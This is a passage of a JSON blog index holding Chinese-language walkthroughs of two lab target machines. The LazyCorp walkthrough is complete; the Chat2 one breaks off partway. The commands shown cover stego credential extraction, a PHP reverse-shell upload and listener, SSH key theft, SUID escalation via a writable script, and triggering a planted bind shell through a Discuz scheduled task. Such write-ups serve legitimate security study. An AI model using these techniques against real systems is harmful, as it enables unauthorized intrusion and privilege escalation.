"https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/224", "commentNum": 0, "wordCount": 6439, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **\u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u7f51\u6bb5\u5185\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u4ee5\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528`arp-scan`\u5de5\u5177\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.149 08:00:27:ea:8b:bc       (Unknown)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.149`\u3002\n\n## **\u7aef\u53e3\u626b\u63cf**\n\n\u786e\u8ba4\u76ee\u6807IP\u540e\uff0c\u4f7f\u7528`nmap`\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:26 EDT\nNmap scan report for 192.168.205.149\nHost is up (0.00018s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:EA:8B:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.19 seconds\n```\n\n\u626b\u63cf\u53d1\u73b0\u5f00\u653e\u4e86\u4e09\u4e2a\u5173\u952e\u7aef\u53e3\uff1a21 (FTP), 22 (SSH), \u548c 80 (HTTP)\u3002\n\n## **FTP\u670d\u52a1\u63a2\u6d4b**\n\nFTP\u670d\u52a1\u901a\u5e38\u53ef\u80fd\u5b58\u5728\u533f\u540d\u8bbf\u95ee\u6f0f\u6d1e\u3002\u5c1d\u8bd5\u4f7f\u7528`anonymous`\u4f5c\u4e3a\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ lftp 192.168.205.149 -u anonymous\n\u5bc6\u7801: anonymous\nlftp anonymous@192.168.205.149:~> ls -al\n...\ndrwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub\nlftp anonymous@192.168.205.149:/> cd pub/\nlftp anonymous@192.168.205.149:/pub> ls -al\n...\n-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg\nlftp anonymous@192.168.205.149:/pub> get note.jpg\n1366786 bytes transferred\n```\n\n\u6210\u529f\u767b\u5f55\u5e76\u53d1\u73b0 `/pub` \u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a\u540d\u4e3a `note.jpg` \u7684\u6587\u4ef6\uff0c\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u3002\n\n## **Web\u76ee\u5f55\u626b\u63cf**\n\n\u5728\u5206\u6790FTP\u6587\u4ef6\u7684\u540c\u65f6\uff0c\u5bf9Web\u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ dirsearch -u http://192.168.205.149/\n...\n[10:29:21] 301 -  317B  - /blog  ->  http://192.168.205.149/blog/\n[10:29:32] 200 -   55B  - /robots.txt\n[10:29:36] 301 -  320B  - /uploads  ->  http://192.168.205.149/uploads/\n...\n```\n\n\u9996\u5148\u67e5\u770b `robots.txt` \u6587\u4ef6\uff0c\u5b83\u901a\u5e38\u4f1a\u6cc4\u9732\u4e00\u4e9b\u540e\u53f0\u8def\u5f84\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.149/robots.txt\nDisallow: /cms-admin.php\nDisallow: /auth-LazyCorp-dev/\n```\n\n`robots.txt` \u6587\u4ef6\u6cc4\u9732\u4e86\u4e24\u4e2a\u8def\u5f84\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cLinux\u7cfb\u7edf\u4e0a\u7684Web\u670d\u52a1\u5668\u8def\u5f84\u901a\u5e38\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\u5c1d\u8bd5\u8bbf\u95ee `robots.txt` \u4e2d\u7ed9\u51fa\u7684 `/auth-LazyCorp-dev/`\uff08\u9996\u5b57\u6bcd\u5927\u5199\uff09\u8fd4\u56de404 Not Found\uff0c\u4f46\u5c1d\u8bd5\u5176\u5c0f\u5199\u7248\u672c `/auth-lazycorp-dev/` \u65f6\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u4e86 `403 Forbidden` \u9519\u8bef\u3002\u8fd9\u4e2a `403` \u9519\u8bef\u7801\u8868\u660e\u8be5\u76ee\u5f55\u786e\u5b9e\u5b58\u5728\uff0c\u53ea\u662f\u6211\u4eec\u6ca1\u6709\u6743\u9650\u76f4\u63a5\u8bbf\u95ee\u6216\u5217\u51fa\u5176\u5185\u5bb9\u3002\n\n\u8fd9\u4e2a\u53d1\u73b0\u81f3\u5173\u91cd\u8981\uff0c\u5b83\u4e3a\u6211\u4eec\u6307\u660e\u4e86\u4e0b\u4e00\u6b65\u7684\u65b9\u5411\uff1a\u5bf9\u8fd9\u4e2a\u5df2\u786e\u8ba4\u5b58\u5728\u7684 `/auth-lazycorp-dev/` \u76ee\u5f55\u8fdb\u884c\u6df1\u5ea6\u7206\u7834\uff0c\u4ee5\u53d1\u73b0\u5176\u4e2d\u9690\u85cf\u7684\u53ef\u8bbf\u95ee\u6587\u4ef6\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.149/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n...\n/login.php            (Status: 200) [Size: 710]\n/uploads              (Status: 301) [Size: 338] [--> http://192.168.205.149/auth-lazycorp-dev/uploads/]\n/dashboard.php        (Status: 302) [Size: 0] [--> login.php]\n...\n```\n\n\u7206\u7834\u6210\u529f\uff0c\u627e\u5230\u4e86\u767b\u5f55\u9875\u9762 `login.php` \u548c\u6587\u4ef6\u4e0a\u4f20\u76ee\u5f55 `uploads`\u3002\n\n\u540c\u65f6\uff0c\u5bf9Web\u670d\u52a1\u7684\u6839\u76ee\u5f55\u8fdb\u884c\u626b\u63cf\u4e5f\u53d1\u73b0\u4e86 `/blog` \u76ee\u5f55\uff0c\u5176\u4e2d\u7684\u6587\u7ae0\u5305\u542b\u91cd\u8981\u7ebf\u7d22\uff1a\n1.  `DevLog #1`: \u63d0\u5230Arvind\u5c06\u51ed\u8bc1\u9690\u85cf\u5728\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u4e2d\u53d1\u9001\u7ed9\u4e86Dev\u3002\u8fd9\u4e0e\u6211\u4eec\u5728FTP\u4e2d\u53d1\u73b0\u7684`note.jpg`\u6587\u4ef6\u76f8\u543b\u5408\u3002\n2.  `DevLog #3`: \u63d0\u5230\u4e00\u4e2a\u4f4d\u4e8e `/usr/local/bin/` \u4e0b\u7684\u91cd\u7f6e\u811a\u672c\u3002\u8fd9\u662f\u540e\u7eed\u63d0\u6743\u7684\u5173\u952e\u4fe1\u606f\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528**\n\n## **\u56fe\u7247\u9690\u5199\u672f\u83b7\u53d6\u51ed\u8bc1**\n\n`DevLog #1` \u5f3a\u70c8\u6697\u793a `note.jpg` \u6587\u4ef6\u4e2d\u542b\u6709\u51ed\u8bc1\u3002\u6211\u4eec\u4f7f\u7528 `stegseek` \u5de5\u5177\u8fdb\u884c\u5206\u6790\u3002`stegseek` \u662f\u4e00\u6b3e\u9ad8\u901f\u7684\u9690\u5199\u7834\u89e3\u5de5\u5177\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u68c0\u6d4b\u548c\u63d0\u53d6`steghide`\u9690\u85cf\u7684\u6570\u636e\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ stegseek note.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: ''\n[i] Original filename: 'creds.txt'.\n[i] Extracting to 'note.jpg.out'.\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat note.jpg.out\nUsername: dev\nPassword: d3v3l0pm3nt!nt3rn\n```\n\n\u6210\u529f\u4ece\u56fe\u7247\u4e2d\u63d0\u53d6\u51fa\u9690\u85cf\u7684\u51ed\u8bc1\u3002\n\n## **\u540e\u53f0\u6587\u4ef6\u4e0a\u4f20Getshell**\n\n\u5229\u7528\u521a\u521a\u83b7\u53d6\u7684\u51ed\u8bc1 `dev:d3v3l0pm3nt!nt3rn` \u767b\u5f55\u4e4b\u524d\u53d1\u73b0\u7684\u540e\u53f0\u5730\u5740 `http://192.168.205.149/auth-lazycorp-dev/login.php`\u3002\n\n\u767b\u5f55\u540e\uff0c\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u3002\u7ed3\u5408\u4e4b\u524d\u7206\u7834\u51fa\u7684 `/uploads` \u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2aPHP\u53cd\u5411shell\u6765\u83b7\u53d6\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u3002\n\n1.  \u5728\u672c\u5730\u51c6\u5907\u4e00\u4e2aPHP\u53cd\u5411shell\uff08\u4f8b\u5982 `reverse.php`\uff09\u3002\n2.  \u901a\u8fc7\u540e\u53f0\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002\n3.  \u5728Kali\u4e0a\u4f7f\u7528 `netcat` \u76d1\u542c\u6307\u5b9a\u7aef\u53e3\u3002\n    ```shell\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n    \u2514\u2500$ nc -lvnp 8888\n    ```\n4.  \u8bbf\u95ee\u4e0a\u4f20\u540e\u7684shell\u6587\u4ef6 `http://192.168.205.149/auth-lazycorp-dev/uploads/reverse.php`\uff0c\u89e6\u53d1\u53cd\u5f39\u3002\n\n```shell\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 37494\nLinux arvindlazycorp 5.4.0-216-generic ...\n...\nwww-data@arvindlazycorp:/$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u6210\u529f\u83b7\u53d6\u4e86\u4e00\u4e2a `www-data` \u7528\u6237\u7684shell\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **\u6a2a\u5411\u79fb\u52a8\uff1awww-data -> arvind**\n\n\u83b7\u53d6\u521d\u59cbshell\u540e\uff0c\u9996\u5148\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u3002\u5728 `/home/arvind/` \u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a `.ssh` \u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542bSSH\u79c1\u94a5 `id_rsa`\u3002\n\n```shell\nwww-data@arvindlazycorp:/$ cd /home/arvind/.ssh\nwww-data@arvindlazycorp:/home/arvind/.ssh$ ls -al\ntotal 20\ndrwxr-xr-x 2 arvind arvind 4096 Jul  9 07:37 .\ndrwxr-xr-x 5 arvind arvind 4096 Jul 16 12:49 ..\n-rw------- 1 arvind arvind  747 Jul  9 07:47 authorized_keys\n-rw-r--r-- 1 arvind arvind 3389 Jul  9 07:37 id_rsa\n-rw-r--r-- 1 arvind arvind  747 Jul  9 07:37 id_rsa.pub\n```\n\n\u5229\u7528\u8fd9\u4e2a\u79c1\u94a5\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ee5 `arvind` \u7528\u6237\u7684\u8eab\u4efd\u767b\u5f55SSH\u3002\n\n```shell\nwww-data@arvindlazycorp:/home/arvind/.ssh$ ssh arvind@127.0.0.1 -i id_rsa\n...\nWelcome to Ubuntu 20.04.6 LTS ...\narvind@arvindlazycorp:~$ id\nuid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `arvind` \u7528\u6237\u3002\n\n## **\u5782\u76f4\u63d0\u6743\uff1aarvind -> root**\n\n\u5728 `arvind` \u7684\u5bb6\u76ee\u5f55\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5177\u6709SUID\u6743\u9650\u7684\u53ef\u6267\u884c\u6587\u4ef6 `reset`\u3002\n\n```shell\narvind@arvindlazycorp:~$ ls -al\n...\n-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset\n...\n```\n\nSUID\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6587\u4ef6\u6743\u9650\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5728\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u4e34\u65f6\u83b7\u5f97\u6587\u4ef6\u6240\u6709\u8005\uff08\u5728\u8fd9\u91cc\u662froot\uff09\u7684\u6743\u9650\u3002\n\n\u4f7f\u7528 `strings` \u547d\u4ee4\u5206\u6790\u8be5\u6587\u4ef6\uff0c\u67e5\u627e\u5176\u529f\u80fd\u3002\n\n```shell\narvind@arvindlazycorp:~$ strings ./reset\n...\n/usr/bin/reset_site.sh\n...\n```\n\n\u5206\u6790\u7ed3\u679c\u663e\u793a\uff0c\u8be5\u7a0b\u5e8f\u4f1a\u8c03\u7528 `/usr/bin/reset_site.sh` \u811a\u672c\u3002\u68c0\u67e5\u8be5\u811a\u672c\u7684\u6743\u9650\u3002\n\n```shell\narvind@arvindlazycorp:~$ ls -la /usr/bin/reset_site.sh\n-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh\n```\n\n\u6211\u4eec\u53d1\u73b0\uff0c\u5f53\u524d\u7528\u6237 `arvind` \u5bf9\u8fd9\u4e2a\u811a\u672c\u6709\u5199\u5165\u6743\u9650\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684SUID\u63d0\u6743\u6f0f\u6d1e\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8be5\u811a\u672c\u5185\u5bb9\uff0c\u8ba9 `reset` \u7a0b\u5e8f\u5728\u4ee5root\u6743\u9650\u6267\u884c\u65f6\uff0c\u8fd0\u884c\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u547d\u4ee4\u3002\n\n1.  \u5c06\u63d0\u6743\u547d\u4ee4\u5199\u5165\u811a\u672c\uff0c\u8fd9\u91cc\u6211\u4eec\u5c06\u4e3a `/bin/bash` \u6dfb\u52a0SUID\u4f4d\u3002\n    ```shell\n    arvind@arvindlazycorp:~$ echo 'chmod +s /bin/bash' > /usr/bin/reset_site.sh\n    ```\n2.  \u6267\u884cSUID\u7a0b\u5e8f `reset` \u6765\u89e6\u53d1\u6211\u4eec\u5199\u5165\u7684\u6076\u610f\u547d\u4ee4\u3002\n    ```shell\n    arvind@arvindlazycorp:~$ ./reset\n    ```\n3.  \u68c0\u67e5 `/bin/bash` \u7684\u6743\u9650\uff0c\u53d1\u73b0\u5df2\u6210\u529f\u8bbe\u7f6eSUID\u4f4d\u3002\n    ```shell\n    arvind@arvindlazycorp:~$ ls -al /bin/bash\n    -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash\n    ```\n4.  \u4f7f\u7528 `-p` \u53c2\u6570\u8fd0\u884c `bash`\uff0c\u4ee5\u4fdd\u7559SUID\u8d4b\u4e88\u7684\u6709\u6548\u7528\u6237ID\uff08euid\uff09\uff0c\u4ece\u800c\u83b7\u5f97root\u6743\u9650\u7684shell\u3002\n    ```shell\n    arvind@arvindlazycorp:~$ bash -p\n    bash-5.0# id\n    uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=...\n    ```\n\n\u6210\u529f\u63d0\u5347\u81f3root\u6743\u9650\u3002\n\n# **\u56db\u3001\u83b7\u53d6Flag**\n\n\u73b0\u5728\uff0c\u6211\u4eec\u62e5\u6709\u4e86\u7cfb\u7edf\u7684\u6700\u9ad8\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709flag\u6587\u4ef6\u3002\n\n```shell\nbash-5.0# cat /root/root.txt /home/arvind/user.txt\nFLAG{lazycorp_reset_exploit_worked}\nFLAG{you_got_foothold_nice}\n```sentence", "top": 0, "createdAt": 1755615101, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-19", "dateLabelColor": "#0969da"}, "P225": {"htmlDir": "docs/post/nei-bu-_Chat2.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Chat2", "postUrl": "post/nei-bu-_Chat2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/225", "commentNum": 0, "wordCount": 7217, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u5728\u4e0e\u76ee\u6807\u7f51\u7edc\u76f8\u540c\u7684\u7f51\u6bb5\u4e0b\uff0c\u4f7f\u7528 `arp-scan` \u5de5\u5177\u5bf9C\u6bb5\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u5185\u7f51\u4e2d\u7684\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.153 08:00:27:44:e8:4a       (Unknown)\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.153`\u3002\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528 `nmap` \u5bf9\u8be5\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p0-65535 192.168.205.153\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 10:02 EDT\nNmap scan report for 192.168.205.153\nHost is up (0.00010s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:44:E8:4A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e8622\u7aef\u53e3\uff08SSH\u670d\u52a1\uff09\u548c80\u7aef\u53e3\uff08HTTP\u670d\u52a1\uff09\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528**\n\n## **1. Web\u4fe1\u606f\u6cc4\u9732**\n\n\u6211\u4eec\u9996\u5148\u4ece80\u7aef\u53e3\u7684Web\u670d\u52a1\u5165\u624b\u3002\u8bbf\u95ee `http://192.168.205.153`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2aDiscuz!\u8bba\u575b\u3002\u5728\u201c\u5728\u7ebf\u4f1a\u5458\u201d\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u4e86\u4e00\u4e2a\u540d\u4e3a `admin` \u7684\u7ba1\u7406\u5458\u7528\u6237\u3002\u6b64\u5916\uff0c\u5728\u9ed8\u8ba4\u7248\u5757\u4e2d\u53d1\u73b0\u4e86\u4e00\u7bc7\u6807\u9898\u4e3a\u201cLet's Encrypt\u201d\u7684\u6587\u7ae0\u3002\n\n![image-20250820220528034](http://7r1UMPHK.github.io/image/20250821102639273.webp)\n\n\u67e5\u770b\u6587\u7ae0\u5185\u5bb9\uff0c\u53d1\u73b0\u662f\u4e00\u6bb5\u6469\u65af\u5bc6\u7801\uff1a\n\n```\n.--. .- ... ... .-- --- .-. -.. .---- ..--- ...--\n```\n\n\u4f7f\u7528\u5728\u7ebf\u6469\u65af\u5bc6\u7801\u89e3\u7801\u5de5\u5177\uff0c\u5f97\u5230\u89e3\u7801\u7ed3\u679c\uff1a\n\n```\nPASSWORD123\n```\n\n> **\u6ce8\u610f**\uff1a\u6469\u65af\u5bc6\u7801\u672c\u8eab\u4e0d\u533a\u5206\u5b57\u6bcd\u5927\u5c0f\u5199\uff0c\u56e0\u6b64\u5728\u5b9e\u9645\u7206\u7834\u6216\u767b\u5f55\u5c1d\u8bd5\u65f6\uff0c\u9700\u8981\u8003\u8651\u6240\u6709\u53ef\u80fd\u7684\u5927\u5c0f\u5199\u7ec4\u5408\uff0c\u5982 `password123`, `Password123`, `PASSWORD123` \u7b49\u3002\n\n## **2. \u83b7\u53d6Web\u540e\u53f0\u6743\u9650**\n\n\u6211\u4eec\u5f53\u524d\u53ea\u77e5\u9053\u7ba1\u7406\u5458\u7528\u6237\u540d\u4e3a `admin`\uff0c\u4f46\u6ca1\u6709SSH\u7684\u7528\u6237\u540d\uff0c\u56e0\u6b64\u9996\u5148\u5c1d\u8bd5\u767b\u5f55Discuz!\u7684Web\u540e\u53f0\u3002\n\n\u4f7f\u7528\u7528\u6237\u540d `admin` \u548c\u521a\u521a\u89e3\u7801\u51fa\u7684\u5bc6\u7801 `password123` \u8fdb\u884c\u767b\u5f55\uff0c\u6210\u529f\u8fdb\u5165\u8bba\u575b\u3002\n\n![image-20250820220813966](http://7r1UMPHK.github.io/image/20250821102705225.webp)\n\n\u5728\u7528\u6237\u754c\u9762\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u4e86\u201c\u7ba1\u7406\u4e2d\u5fc3\u201d\u7684\u5165\u53e3\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u611f\u5174\u8da3\u7684\u5730\u65b9\u3002\u70b9\u51fb\u8fdb\u5165\u65f6\uff0c\u7cfb\u7edf\u8981\u6c42\u518d\u6b21\u9a8c\u8bc1\u5bc6\u7801\uff0c\u6211\u4eec\u8f93\u5165 `password123` \u540e\u6210\u529f\u8fdb\u5165\u540e\u53f0\u3002\n\n## **3. \u6b63\u5411Shell**\n\n\u5728\u540e\u53f0\u9996\u9875\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u8be5Discuz! \u7684\u7248\u672c\u4e3a 3.5 (20250205)\uff0c\u8fd9\u662f\u4e00\u4e2a\u8f83\u65b0\u7684\u7248\u672c\u3002\u7ecf\u8fc7\u521d\u6b65\u641c\u7d22\uff0c\u5e76\u672a\u53d1\u73b0\u8be5\u7248\u672c\u5b58\u5728\u5df2\u77e5\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\u3002\n\n\u4e8e\u662f\uff0c\u6211\u4eec\u5f00\u59cb\u63a2\u7d22\u540e\u53f0\u7684\u5404\u9879\u529f\u80fd\u3002\u5728 **\u5de5\u5177 > \u8ba1\u5212\u4efb\u52a1** \u4e2d\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `shell.php` \u7684\u81ea\u5b9a\u4e49\u4efb\u52a1\u3002\n\n![image-20250820221119024](http://7r1UMPHK.github.io/image/20250821102637022.webp)\n\n\u5c1d\u8bd5\u7f16\u8f91\u8be5\u4efb\u52a1\uff0c\u53d1\u73b0\u5176\u6267\u884c\u7684\u811a\u672c `shell.php` \u662f\u5199\u6b7b\u7684\uff0c\u65e0\u6cd5\u76f4\u63a5\u4fee\u6539\u5176\u5185\u5bb9\u3002\u6839\u636e\u547d\u540d\u63a8\u6d4b\uff0c\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u9884\u7559\u7684WebShell\u6216\u8005\u4e00\u4e2a\u7528\u4e8e\u5efa\u7acb\u8fde\u63a5\u7684\u811a\u672c\u3002\u6211\u4eec\u65e0\u6cd5\u4fee\u6539\u811a\u672c\uff0c\u4f46\u53ef\u4ee5\u63a7\u5236\u5176\u6267\u884c\u65f6\u95f4\u3002\n\n\u6211\u4eec\u5c06\u6267\u884c\u5468\u671f\u7684\u201c\u6bcf\u5468\u201d\u5b57\u6bb5\u6539\u4e3a `*` (\u4ee3\u8868\u6bcf\u5929)\uff0c\u5e76\u5c06\u201c\u5206\u949f\u201d\u5b57\u6bb5\u4fee\u6539\u4e3a\u5f53\u524d\u65f6\u95f4\u7684\u4e0b\u4e00\u5206\u949f\uff08\u4f8b\u5982\uff0c\u5f53\u524d\u662f10:12\uff0c\u5c31\u8bbe\u7f6e\u4e3a13\uff09\u3002\n\n![image-20250820221256884](http://7r1UMPHK.github.io/image/20250821102637186.webp)\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**\uff1a\u8fd9\u662f\u4e00\u79cd\u5229\u7528\u8ba1\u5212\u4efb\u52a1\u83b7\u53d6Shell\u7684\u5e38\u89c1\u624b\u6cd5\u3002\u8fd9\u91cc\u7684 `shell.php` \u6781\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u6b63\u5411Shell\u811a\u672c\uff0c\u5b83\u4f1a\u5728\u88ab\u8bbf\u95ee\u6216\u6267\u884c\u65f6\uff0c\u76d1\u542c\u670d\u52a1\u5668\u7684\u67d0\u4e2a\u7aef\u53e3\uff0c\u7b49\u5f85\u653b\u51fb\u8005\u8fde\u63a5\u3002\n\n\u5230\u8fbe\u8bbe\u5b9a\u7684\u65f6\u95f4\u70b9\uff08xx:13\uff09\u540e\uff0c\u6211\u4eec\u518d\u6b21\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807\u4e3b\u673a\u7684\u7aef\u53e3\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p0-65535 192.168.205.153\n...\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n12345/tcp open  netbus\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u591a\u5f00\u653e\u4e86\u4e00\u4e2a `12345` \u7aef\u53e3\u3002\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 `netcat (nc)` \u8fde\u63a5\u8be5\u7aef\u53e3\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc 192.168.205.153 12345\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u6210\u529f\u8fde\u63a5\uff0c\u5e76\u4e14\u6267\u884c `id` \u547d\u4ee4\u540e\u5f97\u5230\u4e86\u56de\u663e\u3002\u8fd9\u662f\u4e00\u4e2a `www-data` \u7528\u6237\u6743\u9650\u7684\u6b63\u5411Shell\u3002\u4e3a\u4e86\u4fbf\u4e8e\u540e\u7eed\u64cd\u4f5c\uff0c\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5c06\u5176\u5347\u7ea7\u4e3a\u4e00\u4e2a\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n```shell\nscript /dev/null -c bash\n# \u6309\u4e0b Ctrl+Z \u5c06\u5176\u6302\u8d77\nstty raw -echo; fg\n# \u6309\u4e0b\u56de\u8f66\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6a2a\u5411\u79fb\u52a8**\n\n## **1. \u6570\u636e\u5e93\u51ed\u636e\u53d1\u73b0**\n\n\u5f53\u524d\u6211\u4eec\u662f `www-data` \u7528\u6237\uff0c\u6743\u9650\u8f83\u4f4e\u3002\u9996\u5148\uff0c\u6211\u4eec\u5728\u7cfb\u7edf\u4e2d\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u5bfb\u627e\u53ef\u4ee5\u6a2a\u5411\u79fb\u52a8\u5230\u5176\u4ed6\u7528\u6237\u7684\u7ebf\u7d22\u3002\u5728 `/home` \u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `discuz` \u7684\u7528\u6237\u3002\n\n```shell\nwww-data@Chat2:/var/www/html$ cd /home/\nwww-data@Chat2:/home$ ls -la\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Aug  3 09:28 .\ndrwxr-xr-x 18 root   root   4096 Mar 18 20:37 ..\ndrwxr-xr-x  2 discuz discuz 4096 Aug  3 09:46 